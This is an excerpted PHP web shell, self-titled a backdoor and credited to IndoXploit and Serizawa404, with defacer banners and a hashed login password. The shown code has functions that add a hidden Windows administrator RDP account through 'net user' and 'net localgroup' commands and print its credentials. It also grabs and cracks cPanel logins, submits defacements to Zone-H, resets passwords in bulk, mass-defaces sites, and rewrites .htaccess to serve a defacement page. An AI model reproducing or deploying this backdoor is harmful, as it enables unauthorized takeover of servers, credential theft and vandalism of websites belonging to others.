...
$password = "c9e65b370270cf3397c87557cbda4f0d"; # md5: Ibnu1337
...
<style type="text/css">
html { 
  background: url(http://www.poddarschool.com//x.jpg) no-repeat center center fixed; 
...
<header>
<center>
<br><br><br><br><br><br><font Size='5' Face='Ubuntu' Color='Lime'>Remember Us?<br>Marshanda1337,Serizawa404,MR1337,<br>
<font Size='5' Face='Ubuntu' Color='Lime'> Apa lagi yang kucari selain ketenangan setelah hati ku lagi-lagi dikecewakan.<br>
</header>
<br><br><br>
<form method="post">
...
-->
<head>
<title>./Ibnu1337 | Backdoor</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
 background: url(http://wallpaperstock.net/apple-logo-%28black%29_wallpapers_4765_1280x960.jpg) no-repeat center center fixed;
 -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			$htaccess = "Options all\nDirectoryIndex Serizawa404.htm\nSatisfy Any";
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'Serizawa404' already exists."));

		$add_user   = exe("net user Serizawa404    Serizawa404 /add");
    	$add_groups1 = exe("net localgroup Administrators Serizawa404 /add");
    	$add_groups2 = exe("net localgroup Administrator  Serizawa404 /add");
    	$add_groups3 = exe("net localgroup Administrateur Serizawa404 /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "Serizawa404")."<br>
    	Password: ".color(1, 2, "Serizawa404")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Recoded by Serizawa404; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "Serizawa404")."</a></center>";
}
...
function action() {
	...
	print "<li>[ <a href='?dir=".path()."&do=cpanel'>Grab Cpanel</a> ]</li>";
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Serizawa404'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Serizawa404")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='Serizawa404' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='Serizawa404' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Serizawa404</textarea><br>
